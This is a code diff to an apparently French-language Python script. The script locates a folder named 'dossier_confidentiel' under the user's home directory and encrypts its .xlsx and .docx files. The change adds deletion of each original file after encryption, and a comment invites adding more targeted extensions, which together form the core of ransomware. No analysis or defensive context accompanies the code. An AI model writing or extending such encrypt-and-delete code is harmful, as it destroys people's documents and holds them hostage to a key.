@@ -44,20 +44,28 @@ def encrypt_all_files_in_folder(folder_path, extensions, key):
                 print(f"Chiffrement du fichier {file_path}...")
                 encrypt_file(file_path, encrypted_path, key)
                 print(f"Fichier chiffré : {encrypted_path}")
+                
+                # Supprimer le fichier original après le chiffrement
+                try:
+                    os.remove(file_path)
+                    print(f"Fichier original supprimé : {file_path}")
+                except Exception as e:
+                    print(f"Erreur lors de la suppression du fichier {file_path}: {e}")
 
-# Point de départ pour la recherche (dossier utilisateur principal)
-user_home = os.path.expanduser("~")  # Répertoire principal de l'utilisateur (disque principal)
+def encrypt_main():
+    # Point de départ pour la recherche (dossier utilisateur principal)
+    user_home = os.path.expanduser("~")  # Répertoire principal de l'utilisateur (disque principal)
 
-# Rechercher le dossier "dossier_confidentiel"
-confidential_folder = find_confidential_folder(user_home)
+    # Rechercher le dossier "dossier_confidentiel"
+    confidential_folder = find_confidential_folder(user_home)
 
-if confidential_folder:
-    print(f"Dossier 'dossier_confidentiel' trouvé : {confidential_folder}")
-    
-    # Extensions des fichiers à chiffrer
-    file_extensions = [".xlsx", ".docx"]  # Ajoutez ici toutes les extensions ciblées
-    
-    # Chiffrer tous les fichiers dans le dossier trouvé
-    encrypt_all_files_in_folder(confidential_folder, file_extensions, key)
-else:
-    print("Dossier 'dossier_confidentiel' introuvable.")
+    if confidential_folder:
+        print(f"Dossier 'dossier_confidentiel' trouvé : {confidential_folder}")
+        
+        # Extensions des fichiers à chiffrer
+        file_extensions = [".xlsx", ".docx"]  # Ajoutez ici toutes les extensions ciblées
+        
+        # Chiffrer tous les fichiers dans le dossier trouvé
+        encrypt_all_files_in_folder(confidential_folder, file_extensions, key)
+    else:
+        print("Dossier 'dossier_confidentiel' introuvable.")
